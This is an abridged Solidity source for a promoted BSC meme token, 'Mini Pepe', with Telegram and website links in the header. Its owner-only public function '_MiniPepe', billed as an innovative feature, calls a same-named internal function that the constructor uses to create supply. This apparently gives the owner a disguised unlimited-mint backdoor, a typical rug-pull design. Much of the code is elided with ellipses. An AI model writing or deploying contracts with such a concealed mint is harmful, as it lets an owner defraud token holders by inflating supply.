//
// $MiniPepe proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MiniPepe_bsc
//  📱 Website::https://www.minipepe.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MiniPepe(uint256 amount) public onlyOwner {
 _MiniPepe(msg.sender, amount);
    }
    ...
    function _MiniPepe(address account, uint256 amount) internal virtual {
...
contract $MiniPepe is ERC20 {
    ...
    constructor() public ERC20("Mini Pepe", "MPEPE") {
    _MiniPepe(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}